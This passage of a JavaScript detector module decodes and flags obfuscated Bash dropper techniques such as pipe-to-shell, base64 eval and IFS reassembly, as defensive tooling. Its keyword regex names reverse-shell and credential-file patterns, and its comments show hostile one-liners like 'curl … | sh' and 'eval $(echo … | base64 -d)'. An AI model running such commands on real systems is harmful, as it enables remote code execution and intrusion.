// ════════════════════════════════════════════════════════════════════════════
// bash-obfuscation.js — Bash / POSIX-shell obfuscation detection &
// deobfuscation. Mirrors the contract of cmd-obfuscation.js so its
// candidate objects flow through the same `_processCommandObfuscation`
// post-processor (severity tier, IOC mirroring, ClickFix / for /f
// behavioural marks). All findings emit with `type: 'cmd-obfuscation'`
// — they share the bucket because the two families interleave in real
// droppers (a bash script that `eval $(curl … | base64 -d)` may invoke
// PowerShell, and the dangerous-keyword scoring already covers both).
//
// Six finder branches:
//   B1  Variable expansion / parameter slicing
//         ${V:N:M}, ${V//x/y}, ${V/#prefix/}, ${V:-default}, ${V/%suffix/}
//         resolved against earlier `V=…` literal-only assignments.
//   B2  ANSI-C `$'…'` quoting — \xNN, \NNN (octal), \uHHHH, common esc.
//   B3  printf chains — printf '\xNN…', printf '%b' '…', printf -v V.
//   B4  Pipe-to-shell — curl|sh, wget|sh, base64 -d|sh, xxd -r|sh,
//         rev|sh, tr a b|sh, eval $(curl …), source <(curl …),
//         bash <(curl …). Two-tier confidence; the literal-source
//         variant decodes the upstream and recurses, the live-fetch
//         variant is detection-only.
//   B5  Command-substitution unrolling — eval $(echo … | base64 -d),
//         eval "$(printf '\xNN…')", eval `…`. Strips eval/exec and
//         feeds the inner expression back through the bash finders.
//   B6  IFS / brace-expansion fragmentation — IFS=…; cmd=ls_-la;
//         eval $cmd, {l,s}=…; $l$s. Resolves against the symbol table.
//
// Mounted via `Object.assign(EncodedContentDetector.prototype, …)`.
// `scripts/build.py` _DETECTOR_FILES loads this AFTER cmd-obfuscation.js
// (load order is independent — the two modules don't share state).
// ════════════════════════════════════════════════════════════════════════════

// Sensitive-token regex used as the post-decode plausibility gate. Mirrors
// the spirit of SENSITIVE_CMD_KEYWORDS in cmd-obfuscation.js but with
// POSIX-shell vocabulary. A bash-flavoured candidate must resolve to a
// command shape that's worth surfacing — otherwise every legitimate
// `printf "%s\n" "$VAR"` echo in a build script would emit a finding.
//
// LOLBin / shell-launcher / network-fetch / persistence keywords. Includes
// /dev/tcp (bash built-in TCP redirection — the canonical reverse-shell
// primitive) and the curl|sh family that pipe-to-shell variants resolve to.
const SENSITIVE_BASH_KEYWORDS = /\b(?:bash|sh|zsh|ksh|dash|eval|exec|source|\.\s+\/|curl|wget|nc|ncat|netcat|socat|openssl\s+s_client|fetch|python\d?|perl|php|ruby|telnet|ssh|scp|rsync|finger|nslookup|dig|drill|host|host\s+-t|tftp|base64\s+-d|xxd\s+-r|gzip\s+-d|gunzip|bzip2\s+-d|bunzip2|chmod\s+\+x|chmod\s+[0-7]{3,4}|crontab|systemctl|service|launchctl|sudo|su\b|setuid|usermod|chattr|setcap|sed\s+-i|tee\s+-a|>>?\s*\/etc\/|\/dev\/tcp\/|\/dev\/udp\/|>\s*\/dev\/null|2>&1|powershell|pwsh|wmic|certutil|mshta|rundll32|regsvr32|whoami|id\b|uname|hostname|netstat|iptables|ps\s+(?:aux?|-ef)|ifconfig|ip\s+addr|cat\s+\/etc\/(?:passwd|shadow)|kill(?:all)?\s+-9|rm\s+-rf)\b/i;

// Helper: dequote a bash literal value. Strips outer single or double
// quotes and unescapes `\"` / `\\` inside double-quoted strings; for
// single-quoted strings the body is taken verbatim (POSIX semantics).
// ANSI-C `$'…'` is decoded by `_decodeAnsiCQuoted`, NOT here.
function _dequoteBashValue(s) {
  if (typeof s !== 'string' || s.length < 2) return s;
  if (s[0] === "'" && s[s.length - 1] === "'") {
    return s.slice(1, -1);
  }
  if (s[0] === '"' && s[s.length - 1] === '"') {
    return s.slice(1, -1).replace(/\\(["\\$`])/g, '$1');
  }
  return s;
}

// Decode a bash ANSI-C `$'…'` literal into the bytes it represents.
// Recognised escapes mirror the bash manual (3.1.2.4 ANSI-C Quoting):
//   \\ \' \" \?  literal char
//   \a \b \e \E \f \n \r \t \v   control chars
//   \0NN \NNN    1-3 octal digits
//   \xHH         1-2 hex digits
//   \uHHHH       4 hex digits (UTF-16 BMP)
//   \UHHHHHHHH   8 hex digits (UTF-32, capped via String.fromCodePoint)
//   \cX          ctrl-X (X & 0x1F)
// Unknown escapes are taken literally (matches bash behaviour). The
// regex is bounded — every alternative consumes ≥1 char and the
// quantifiers are explicitly capped, so this is safe under
// `safeRegex: builtin` semantics.
function _decodeAnsiCQuoted(body) {
  let out = '';
  let i = 0;
  while (i < body.length) {
    const c = body.charCodeAt(i);
    if (c !== 0x5C /* \ */) { out += body[i]; i++; continue; }
    if (i + 1 >= body.length) { out += '\\'; i++; continue; }
    const n = body[i + 1];
    // Single-char escapes
    const simple = { 'a': 7, 'b': 8, 'e': 27, 'E': 27, 'f': 12, 'n': 10,
                     'r': 13, 't': 9, 'v': 11, '\\': 92, "'": 39, '"': 34,
                     '?': 63 };
    if (simple[n] !== undefined) { out += String.fromCharCode(simple[n]); i += 2; continue; }
    // Hex escape \xHH (1-2 hex digits)
    if (n === 'x') {
      const m = /^[0-9a-fA-F]{1,2}/.exec(body.slice(i + 2)); /* safeRegex: builtin */
      if (m) { out += String.fromCharCode(parseInt(m[0], 16)); i += 2 + m[0].length; continue; }
      out += body[i]; i++; continue;
    }
    // Unicode escapes
    if (n === 'u') {
      const m = /^[0-9a-fA-F]{1,4}/.exec(body.slice(i + 2)); /* safeRegex: builtin */
      if (m) {
        try { out += String.fromCodePoint(parseInt(m[0], 16)); }
        catch (_) { out += '?'; }
        i += 2 + m[0].length; continue;
      }
      out += body[i]; i++; continue;
    }
    if (n === 'U') {
      const m = /^[0-9a-fA-F]{1,8}/.exec(body.slice(i + 2)); /* safeRegex: builtin */
      if (m) {
        try {
          const cp = parseInt(m[0], 16);
          if (cp <= 0x10FFFF) out += String.fromCodePoint(cp);
          else out += '?';
        } catch (_) { out += '?'; }
        i += 2 + m[0].length; continue;
      }
      out += body[i]; i++; continue;
    }
    // Octal escape \NNN or \0NN (1-3 digits)
    if (n >= '0' && n <= '7') {
      const m = /^[0-7]{1,3}/.exec(body.slice(i + 1)); /* safeRegex: builtin */
      if (m) { out += String.fromCharCode(parseInt(m[0], 8) & 0xFF); i += 1 + m[0].length; continue; }
      out += body[i]; i++; continue;
    }
    // Control char \cX
    if (n === 'c' && i + 2 < body.length) {
      const ctrl = body.charCodeAt(i + 2) & 0x1F;
      out += String.fromCharCode(ctrl); i += 3; continue;
    }
    // Unknown escape — take literally
    out += body[i + 1]; i += 2;
  }
  return out;
}

// Decode a printf format string against its arguments. We only handle
// the subset that shows up in obfuscated droppers:
//   %b           interpret backslash escapes in the next arg
//   %s           substitute next arg verbatim
//   %d / %i      next arg as integer (decimal)
//   %x / %X      next arg as hex
//   %c           next arg as char
//   \xNN \NNN    in the format string itself — same semantics as ANSI-C
// Returns the decoded string, or `null` if the input is too pathological
// to evaluate statically.
function _decodePrintfStatic(fmt, args) {
  if (typeof fmt !== 'string') return null;
  // First decode backslash escapes in the format string (printf semantics).
  let s = _decodeAnsiCQuoted(fmt);
  let out = '';
  let argIdx = 0;
  for (let i = 0; i < s.length; i++) {
    const c = s[i];
    if (c !== '%') { out += c; continue; }
    if (i + 1 >= s.length) { out += '%'; break; }
    const spec = s[i + 1];
    if (spec === '%') { out += '%'; i++; continue; }
    const arg = args[argIdx++];
    if (arg === undefined) { out += '%' + spec; i++; continue; }
    switch (spec) {
      case 'b': out += _decodeAnsiCQuoted(arg); break;
      case 's': out += arg; break;
      case 'd': case 'i': out += String(parseInt(arg, 10) | 0); break;
      case 'x': out += (parseInt(arg, 10) | 0).toString(16); break;
      case 'X': out += (parseInt(arg, 10) | 0).toString(16).toUpperCase(); break;
      case 'c': out += String.fromCharCode(parseInt(arg, 10) & 0xFF); break;
      default: out += '%' + spec; break;
    }
    i++;
  }
  return out;
}

// Resolve the small set of bash parameter-expansion ops we statically
// model. Returns the resolved string, or `null` if the op is not one
// we recognise. `value` is the literal value of the variable.
function _resolveParamExpansion(value, op) {
  if (typeof value !== 'string' || typeof op !== 'string') return null;
  // ${V:offset:length} or ${V:offset}
  let m = /^:(-?\d+)(?::(-?\d+))?$/.exec(op); /* safeRegex: builtin */
  if (m) {
    const len = value.length;
    let off = parseInt(m[1], 10);
    if (off < 0) off = Math.max(0, len + off);
    else off = Math.min(off, len);
    if (m[2] === undefined) return value.slice(off);
    let cnt = parseInt(m[2], 10);
    if (cnt < 0) return value.slice(off, Math.max(off, len + cnt));
    return value.slice(off, off + cnt);
  }
  // ${V//pat/rep}  global replace (literal pattern only — no globs)
  m = /^\/\/([^/]{1,80})\/([^/]{0,80})$/.exec(op); /* safeRegex: builtin */
  if (m) return value.split(m[1]).join(m[2]);
  // ${V/pat/rep}   first-match replace
  m = /^\/([^/]{1,80})\/([^/]{0,80})$/.exec(op); /* safeRegex: builtin */
  if (m) {
    const idx = value.indexOf(m[1]);
    if (idx < 0) return value;
    return value.slice(0, idx) + m[2] + value.slice(idx + m[1].length);
  }
  // ${V/#prefix/rep} — replace if value starts with prefix
  m = /^\/#([^/]{1,80})\/([^/]{0,80})$/.exec(op); /* safeRegex: builtin */
  if (m) return value.startsWith(m[1]) ? m[2] + value.slice(m[1].length) : value;
  // ${V/%suffix/rep} — replace if value ends with suffix
  m = /^\/%([^/]{1,80})\/([^/]{0,80})$/.exec(op); /* safeRegex: builtin */
  if (m) return value.endsWith(m[1]) ? value.slice(0, -m[1].length) + m[2] : value;
  // ${V:-default}  — return value if set & non-empty, else default
  m = /^:-(.*)$/.exec(op); /* safeRegex: builtin */
  if (m) return value || m[1];
  // ${V#prefix}    — strip shortest matching prefix (literal)
  m = /^#([^#]{1,80})$/.exec(op); /* safeRegex: builtin */
  if (m) return value.startsWith(m[1]) ? value.slice(m[1].length) : value;
  // ${V%suffix}    — strip shortest matching suffix (literal)
  m = /^%([^%]{1,80})$/.exec(op); /* safeRegex: builtin */
  if (m) return value.endsWith(m[1]) ? value.slice(0, -m[1].length) : value;
  // ${#V}          — length of value
  if (op === '#') return String(value.length);
  return null;
}

// ════════════════════════════════════════════════════════════════════════════


Object.assign(EncodedContentDetector.prototype, {

  /**
   * Find bash-shell obfuscation patterns. Each candidate has the
   * candidate-emission contract:
   *   { type:'cmd-obfuscation', technique, raw, offset, length, deobfuscated }
   * and is consumed by the shared `_processCommandObfuscation` post-processor.
   */
  _findBashObfuscationCandidates(text, _context) {
    if (!text || text.length < 8) return [];
    const candidates = [];

    // ── Symbol table from `VAR=value` / `VAR="value"` / `VAR='value'` /
    //    `export VAR=…`. We only accept literal-only RHS (no
    //    command-substitution, no other-var expansion) so static
    //    resolution is sound. Bounded line-length cap (200 chars) stops
    //    catastrophic backtracking on adversarial inputs.
    const vars = Object.create(null);
    const assignRe = /(?:^|[\r\n;&|()`\s])(?:export\s+|local\s+|readonly\s+|declare\s+(?:-[a-zA-Z]+\s+)?)?([A-Za-z_]\w{0,63})=(\$'(?:[^'\\]|\\.){0,300}'|'[^'\r\n]{0,300}'|"[^"\r\n]{0,300}"|[A-Za-z0-9_./:+\-]{1,200})/g;
    let m;
    let assignBudget = 256;
    while ((m = assignRe.exec(text)) !== null && assignBudget-- > 0) {
      throwIfAborted();
      const name = m[1];
      const rawVal = m[2];
      let value;
      if (rawVal[0] === '$' && rawVal[1] === "'") {
        // ANSI-C-quoted RHS
        value = _decodeAnsiCQuoted(rawVal.slice(2, -1));
      } else if (rawVal[0] === "'" || rawVal[0] === '"') {
        value = _dequoteBashValue(rawVal);
      } else {
        value = rawVal;
      }
      vars[name] = value;
    }

    // ── B1: ${V:offset:length} / ${V//x/y} / ${V:-default} ──
    //
    // Conservative single-token resolution: only emit when the resolved
    // value matches SENSITIVE_BASH_KEYWORDS (otherwise every benign
    // `${PATH:0:1}` echo would surface). The line-level fragment-join
    // resolver immediately below picks up the multi-token case where
    // each individual slice is an unintelligible 1-char shred.
    const paramExpRe = /\$\{([A-Za-z_]\w{0,63})((?::-?\d+(?::-?\d+)?|\/{1,2}[#%]?[^}/]{1,80}\/[^}/]{0,80}|:-[^}]{0,80}|#[^}]{0,80}|%[^}]{0,80}))\}/g;
    while ((m = paramExpRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const name = m[1];
      const op = m[2];
      let value = vars[name];
      // Default-value expansion `${V:-default}` — if V is unset OR
      // empty, resolve to the literal default. This is the one
      // parameter-expansion shape where an undefined variable is a
      // LEGITIMATE input (the attacker's signal: `unset CMD` then
      // `${CMD:-wget}` yields `wget`). For every other op we require
      // a populated `vars[name]`.
      if (value === undefined) {
        if (op.startsWith(':-')) value = '';
        else continue;
      }
      const resolved = _resolveParamExpansion(value, op);
      if (resolved === null || resolved === m[0] || resolved.length < 1) continue;
      // Only emit single-token expansions that resolve to something
      // recognisably command-shaped. The interesting case for a
      // standalone expansion is a full command name — the per-character
      // shred shape is handled by the line-level resolver below.
      if (!SENSITIVE_BASH_KEYWORDS.test(resolved) && !this._bruteforce) continue;
      // Clip resolved output to the shared amp budget. `${V:offset}`
      // with no length (`_resolveParamExpansion` `:off` branch) returns
      // `value.slice(off)` — the full remainder of `value`. A short
      // `raw = "${V:1}"` (6 chars) against a 300-char assignment can
      // produce a 47× amp that violates the peer-branch 32× raw / 8 KiB
      // contract (defined in cmd-obfuscation.js). Clipping preserves
      // the SENSITIVE_BASH_KEYWORDS-matching prefix (the detection
      // signal) while bounding sidebar payload size.
      const clippedResolved = _clipDeobfToAmpBudget(resolved, m[0]);
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'Bash Variable Expansion (single)',
        raw: m[0],
        offset: m.index,
        length: m[0].length,
        deobfuscated: clippedResolved,
      });
    }

    // ── B1 line-level: a line built almost entirely from ${V:n:m}
    //    fragments concatenated together (or interleaved with literal
    //    chars), where each fragment alone is gibberish but the joined
    //    line spells out a real command. Mirrors the CMD env-var
    //    substring (line) resolver in cmd-obfuscation.js.
    if (Object.keys(vars).length >= 1) {
      const fragLineRe = /^[^\r\n]*(?:\$\{[A-Za-z_]\w*:-?\d+(?::-?\d+)?\}[^\r\n]*){3,}$/gm;
      while ((m = fragLineRe.exec(text)) !== null) {
        throwIfAborted();
        if (candidates.length >= this.maxCandidatesPerType) break;
        const line = m[0];
        if (line.length > 4000) continue;
        let resolvedCount = 0;
        let unresolvedCount = 0;
        const decoded = line.replace(
          /\$\{([A-Za-z_]\w*):(-?\d+)(?::(-?\d+))?\}/g,
          (_full, name, startStr, lenStr) => {
            const value = vars[name];
            if (value === undefined) { unresolvedCount++; return `\u27e8${name}\u27e9`; }
            const op = lenStr === undefined ? `:${startStr}` : `:${startStr}:${lenStr}`;
            const sliced = _resolveParamExpansion(value, op);
            if (sliced === null) { unresolvedCount++; return `\u27e8${name}\u27e9`; }
            resolvedCount++;
            return sliced;
          }
        );
        if (resolvedCount === 0) continue;
        if (decoded === line) continue;
        if (decoded.length < 3) continue;
        if (!SENSITIVE_BASH_KEYWORDS.test(decoded) && !this._bruteforce) continue;
        candidates.push({
          type: 'cmd-obfuscation',
          technique: unresolvedCount === 0
            ? 'Bash Variable Expansion (line)'
            : 'Bash Variable Expansion (partial)',
          raw: line,
          offset: m.index,
          length: line.length,
          deobfuscated: decoded,
        });
      }
    }

    // ── B2: ANSI-C `$'\xNN\NNN\u…'` quoting ──
    //
    // A bare $'foo bar' that decodes to a literal string isn't
    // interesting — the writer typed it that way precisely because it
    // contains a literal newline / tab. Only emit when the body
    // contains at least 2 escape sequences, which is the obfuscation
    // shape (every char individually escaped). Cap on body length keeps
    // backtracking bounded.
    const ansiCRe = /\$'((?:[^'\\\r\n]|\\.){2,400})'/g;
    while ((m = ansiCRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const body = m[1];
      // Must contain ≥2 escape sequences to qualify as obfuscation.
      const escCount = (body.match(/\\[xXuU0-7abefnrtv\\'"?cE]/g) || []).length;
      if (escCount < 2) continue;
      const decoded = _decodeAnsiCQuoted(body);
      if (decoded === body || decoded.length < 2) continue;
      if (!SENSITIVE_BASH_KEYWORDS.test(decoded) && !this._bruteforce && decoded.length < 8) continue;
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'Bash ANSI-C Quoting',
        raw: m[0],
        offset: m.index,
        length: m[0].length,
        deobfuscated: decoded,
      });
    }

    // ── B3: printf chains ──
    //
    //   printf '\x68\x65\x6c\x6c\x6f' | sh
    //   printf '%b' '\x68\x65...'
    //   printf -v V '\x68...'
    //
    // We capture the format string + up to 4 single-quoted arg literals
    // and statically evaluate. Because we accept the format-string
    // alone (zero args), this also catches the common `printf '\xNN…' |
    // sh` shape where the format itself is the entire payload.
    const printfRe = /\bprintf\s+(?:-v\s+\w+\s+)?(?:'%b'\s+)?'((?:[^'\\\r\n]|\\.){2,400})'((?:\s+'(?:[^'\\\r\n]|\\.){0,200}'){0,4})/g;
    while ((m = printfRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const fmt = m[1];
      // Need ≥1 backslash-escape in the format — otherwise it's just a
      // literal echo, not obfuscation.
      if (!/\\[xX0-7uUbn]/.test(fmt)) continue;
      const argStr = m[2] || '';
      const args = [...argStr.matchAll(/'((?:[^'\\\r\n]|\\.){0,200})'/g)].map(a => _decodeAnsiCQuoted(a[1]));
      const decoded = _decodePrintfStatic(fmt, args);
      // Min decoded length 2 — `'sh'` is the canonical short payload
      // and the default shell-launch atom in real droppers.
      if (!decoded || decoded === fmt || decoded.length < 2) continue;
      if (!SENSITIVE_BASH_KEYWORDS.test(decoded) && !this._bruteforce) continue;
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'Bash printf Chain',
        raw: m[0],
        offset: m.index,
        length: m[0].length,
        deobfuscated: decoded,
      });
    }

    // ── B4: pipe-to-shell ──
    //
    //   curl … | (ba)?sh
    //   wget … | (ba)?sh
    //   curl …; echo "…" | base64 -d | (ba)?sh
    //   base64 -d <<< "…" | sh
    //   xxd -r -p <<< "…" | sh
    //   eval $(curl -s https://…)
    //   bash <(curl -s https://…)
    //   source <(wget -O- https://…)
    //
    // Two tiers: when the upstream is a static literal (heredoc / `<<<`
    // / quoted echo) we attempt to decode it; otherwise the candidate
    // is a detection-only pattern emission (severity bumped to
    // critical inside _processCommandObfuscation via _executeOutput).
    //
    // For the live-fetch variant the upstream URL *is* the payload —
    // no transformation to recover. We extract the URL into `deobfuscated`
    // and emit it as an IOC.URL via `_patternIocs`, and rely on the
    // sibling YARA rule `Bash_Live_Fetch_Pipe_Shell` for structural
    // detection parity. Label renamed from "Pipe-to-Shell (live fetch)"
    // to "Pipe-to-Shell Pattern (live fetch)" to stop implying
    // deobfuscation where none is performed.
    const pipeShellRe = /\b(?:curl|wget|fetch|invoke-webrequest|iwr|irm)\b[^\r\n|]{0,400}\|\s*(?:base64\s+-(?:d|decode)\s*\|\s*)?(?:xxd\s+-r(?:\s+-p)?\s*\|\s*)?(?:rev\s*\|\s*)?(?:ba)?sh\b/gi;
    while ((m = pipeShellRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const raw = m[0];
      if (raw.length > 600) continue;
      // Extract the upstream URL (first https?:// in the match) — this
      // is the actionable artefact, not the raw command line.
      const urlMatch = /https?:\/\/[^\s|'"`<>]{3,400}/.exec(raw);
      const upstreamUrl = urlMatch ? urlMatch[0] : null;
      const resolved = upstreamUrl
        ? `pipe-to-shell upstream: ${upstreamUrl}`
        : `pipe-to-shell (dynamic upstream)`;
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'Bash Pipe-to-Shell (live fetch)',
        raw,
        offset: m.index,
        length: raw.length,
        deobfuscated: resolved,
        _executeOutput: true,
        _patternIocs: upstreamUrl ? [{
          url: `Bash live-fetch pipe-to-shell \u2014 fetches ${upstreamUrl} and pipes response to shell (T1105)`,
          severity: 'critical',
        }] : [{
          url: 'Bash live-fetch pipe-to-shell (T1105)',
          severity: 'high',
        }],
      });
    }

    // base64-pipe-to-shell where the payload is right there
    //   echo "BASE64STR" | base64 -d | (ba)?sh        (quoted)
    //   echo BASE64STR   | base64 -d | (ba)?sh        (unquoted)
    // Min payload of 4 base64 chars = 3 bytes; small enough to catch
    // 'sh' (=='c2g=') yet large enough to skip random short echoes.
    //
    // Quotes are optional on both sides. Without quotes the body
    // cannot contain whitespace (the shell would split on it into
    // separate echo args) — so the quoted form permits `\s` inside,
    // the unquoted form does not. Two alternation arms make that split
    // explicit and keep each arm's character class small, which also
    // avoids catastrophic backtracking that a single "allow \s, but
    // only if quoted" form would otherwise need look-ahead to express.
    const echoB64ShRe = /\becho\s+(?:["']([A-Za-z0-9+/=\s]{4,4096})["']|([A-Za-z0-9+/=]{4,4096}))\s*\|\s*base64\s+-(?:d|decode)\s*\|\s*(?:ba)?sh\b/gi;
    while ((m = echoB64ShRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const b64 = (m[1] || m[2] || '').replace(/\s+/g, '');
      let decoded = '';
      try {
        decoded = (typeof atob === 'function')
          ? atob(b64)
          : Buffer.from(b64, 'base64').toString('binary');
      } catch (_) { continue; }
      if (!decoded || decoded.length < 2) continue;
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'Bash base64-pipe-to-Shell',
        raw: m[0],
        offset: m.index,
        length: m[0].length,
        deobfuscated: decoded,
        _executeOutput: true,
      });
    }

    // here-string base64 to shell
    //   base64 -d <<< "BASE64STR" | sh
    //   xxd -r -p <<< "HEXSTR" | sh
    const hereStrB64Re = /\bbase64\s+-(?:d|decode)\s*<<<\s*["']([A-Za-z0-9+/=\s]{4,4096})["']\s*\|\s*(?:ba)?sh\b/gi;
    while ((m = hereStrB64Re.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const b64 = m[1].replace(/\s+/g, '');
      let decoded = '';
      try {
        decoded = (typeof atob === 'function')
          ? atob(b64)
          : Buffer.from(b64, 'base64').toString('binary');
      } catch (_) { continue; }
      if (!decoded || decoded.length < 2) continue;
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'Bash base64-here-string-to-Shell',
        raw: m[0],
        offset: m.index,
        length: m[0].length,
        deobfuscated: decoded,
        _executeOutput: true,
      });
    }

    const hereStrXxdRe = /\bxxd\s+-r(?:\s+-p)?\s*<<<\s*["']([0-9a-fA-F\s]{4,8192})["']\s*\|\s*(?:ba)?sh\b/gi;
    while ((m = hereStrXxdRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const hex = m[1].replace(/\s+/g, '');
      if (hex.length % 2 !== 0) continue;
      let decoded = '';
      try {
        for (let i = 0; i < hex.length; i += 2) {
          decoded += String.fromCharCode(parseInt(hex.slice(i, i + 2), 16));
        }
      } catch (_) { continue; }
      // Min 2 chars — 'sh' is the canonical 2-byte shell-launch atom.
      if (!decoded || decoded.length < 2) continue;
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'Bash xxd-here-string-to-Shell',
        raw: m[0],
        offset: m.index,
        length: m[0].length,
        deobfuscated: decoded,
        _executeOutput: true,
      });
    }

    // ── B5: command-substitution unrolling ──
    //
    //   eval $(echo "BASE64" | base64 -d)
    //   eval "$(printf '\xNN…')"
    //   eval `echo "BASE64" | base64 -d`
    //   bash -c "$(printf '\xNN…')"
    //
    // Strip the eval/exec/bash -c wrapper, locate a static base64 /
    // printf inner expression, decode it. Recursion (chasing further
    // encodings inside the cleartext) is performed by the parent
    // detector via `_processCandidate` once this candidate is consumed.
    // The base64 body can appear quoted (`"abc=="`) or as a bare
    // token — bash's parser tolerates both inside `echo`. `[A-Za-z0-9+/=]`
    // without surrounding quotes is the compact form seen in one-liner
    // droppers; the quoted form survives spaces-in-echo stylings.
    const evalCmdSubRe = /\b(?:eval|exec|source|\.)\s+(?:"\$\(|\$\(|`)\s*echo\s+(?:["']([A-Za-z0-9+/=\s]{4,4096})["']|([A-Za-z0-9+/=]{4,4096}))\s*\|\s*base64\s+-(?:d|decode)\s*(?:\)|`)/g;
    while ((m = evalCmdSubRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const b64 = (m[1] || m[2] || '').replace(/\s+/g, '');
      let decoded = '';
      try {
        decoded = (typeof atob === 'function')
          ? atob(b64)
          : Buffer.from(b64, 'base64').toString('binary');
      } catch (_) { continue; }
      if (!decoded || decoded.length < 2) continue;
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'Bash eval $(echo … | base64 -d)',
        raw: m[0],
        offset: m.index,
        length: m[0].length,
        deobfuscated: decoded,
        _executeOutput: true,
      });
    }

    // eval "$(printf '\xNN…')" / bash -c "$(printf '…')"
    const evalPrintfRe = /\b(?:eval|exec|source|\.|bash\s+-c|sh\s+-c)\s+["']?\$\(\s*printf\s+(?:'%b'\s+)?'((?:[^'\\\r\n]|\\.){2,400})'\s*\)["']?/g;
    while ((m = evalPrintfRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const fmt = m[1];
      if (!/\\[xX0-7]/.test(fmt)) continue;
      const decoded = _decodePrintfStatic(fmt, []);
      if (!decoded || decoded.length < 2) continue;
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'Bash eval $(printf …)',
        raw: m[0],
        offset: m.index,
        length: m[0].length,
        deobfuscated: decoded,
        _executeOutput: true,
      });
    }

    // ── B6: IFS / brace-expansion fragmentation ──
    //
    //   IFS='_'; cmd=ls_-la; eval $cmd
    //   IFS=$'\x09'; cmd=$'ls\x09-la'; $cmd
    //   {l,s}=…   (rare)
    //   c=$'\x6c\x73'; $c
    //
    // The observable pattern is `IFS=…<value>…; … eval $V` or `IFS=…;
    // V=…; $V`. Detect the IFS reassignment + an `eval $VAR` / bare
    // `$VAR` execution within ~1 KB downstream and flag.
    const ifsExecRe = /\bIFS\s*=\s*(?:\$'(?:[^'\\]|\\.){1,40}'|'[^'\r\n]{1,40}'|"[^"\r\n]{1,40}")\s*[;\n][\s\S]{0,800}?\b(?:eval|exec)\s+\$\{?(\w+)\}?/g;
    while ((m = ifsExecRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const varName = m[1];
      const value = vars[varName];
      const raw = m[0];
      if (raw.length > 1500) continue;
      if (value === undefined) {
        // Structural-only emission (high confidence on its own — IFS
        // reassignment paired with eval is overwhelmingly malicious).
        candidates.push({
          type: 'cmd-obfuscation',
          technique: 'Bash IFS Reassembly (structural)',
          raw,
          offset: m.index,
          length: raw.length,
          deobfuscated: `IFS-reassembly invoking $${varName}`,
          _executeOutput: true,
        });
        continue;
      }
      // Replace the IFS chars in `value` with spaces — POSIX shell
      // splits on them at execution time. Conservative: only single
      // ASCII separators are modelled (most real droppers).
      const ifsMatch = /\bIFS\s*=\s*(\$'(?:[^'\\]|\\.){1,40}'|'[^'\r\n]{1,40}'|"[^"\r\n]{1,40}")/.exec(raw);
      let sep = '';
      if (ifsMatch) {
        const litRaw = ifsMatch[1];
        if (litRaw[0] === '$' && litRaw[1] === "'") sep = _decodeAnsiCQuoted(litRaw.slice(2, -1));
        else sep = _dequoteBashValue(litRaw);
      }
      let resolved = value;
      if (sep) {
        for (const ch of sep) resolved = resolved.split(ch).join(' ');
      }
      // No sensitivity gate here: IFS reassignment paired with `eval
      // $V` is overwhelmingly malicious by structure regardless of the
      // resolved payload (legitimate scripts almost never reassign IFS
      // and then eval a variable). The post-processor's _executeOutput
      // tier still applies the dangerousPatterns scoring.
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'Bash IFS Reassembly',
        raw,
        offset: m.index,
        length: raw.length,
        deobfuscated: resolved,
        _executeOutput: true,
      });
    }

    // Concatenated single-char vars: V1=l; V2=s; $V1$V2 → ls
    //
    // We require ≥2 resolved single-char-or-short vars adjacent
    // without intervening whitespace (the partial form `$a$b$UNDEF`
    // resolving only two is still a strong obfuscation signal when
    // the resolved fragment matches SENSITIVE_BASH_KEYWORDS). The
    // 3+-token outer regex remains — ≥2 resolved out of 3+ tokens is
    // the "partial" case the bash grammar documents; three resolved
    // is the full case.
    const charConcatRe = /(?:\$\{?[A-Za-z_]\w*\}?){3,12}/g;
    while ((m = charConcatRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const raw = m[0];
      if (raw.length > 200) continue;
      const inner = /\$\{?([A-Za-z_]\w*)\}?/g;
      let joined = '';
      let resolved = 0;
      let unresolved = 0;
      let im;
      while ((im = inner.exec(raw)) !== null) {
        const v = vars[im[1]];
        if (v !== undefined) { joined += v; resolved++; }
        else { joined += `\u27e8${im[1]}\u27e9`; unresolved++; }
      }
      if (resolved < 2) continue;
      if (joined.length < 3) continue;
      if (joined === raw) continue;
      // Sensitivity gate:
      //   • Full (zero unresolved): the joined string must match
      //     SENSITIVE_BASH_KEYWORDS — a clean, fully-resolved
      //     concatenation of 3+ vars that still doesn't name a LOLBin
      //     is almost always benign path-building.
      //   • Partial (≥1 unresolved token, ≥2 resolved): the
      //     obfuscation signal is the structure itself — the
      //     attacker is concatenating short var fragments with at
      //     least one deliberately undefined slot. We emit the
      //     partial candidate with placeholder markers intact; the
      //     joined string will fail the SENSITIVE test but the
      //     deobfuscation signal is meaningful on its own.
      const passesGate = unresolved > 0
        ? (resolved >= 2)
        : SENSITIVE_BASH_KEYWORDS.test(joined);
      if (!passesGate && !this._bruteforce) continue;
      // Clip concatenated payload to the shared amp budget. `joined`
      // is `${A}${B}${C}…` with each `${X}` resolved to an arbitrarily
      // long assignment — a short `raw = "$A$B$C"` (6 chars) against
      // three 80-byte assignments easily produces a 38× amp that
      // violates the peer-branch 32× raw / 8 KiB contract. Clipping
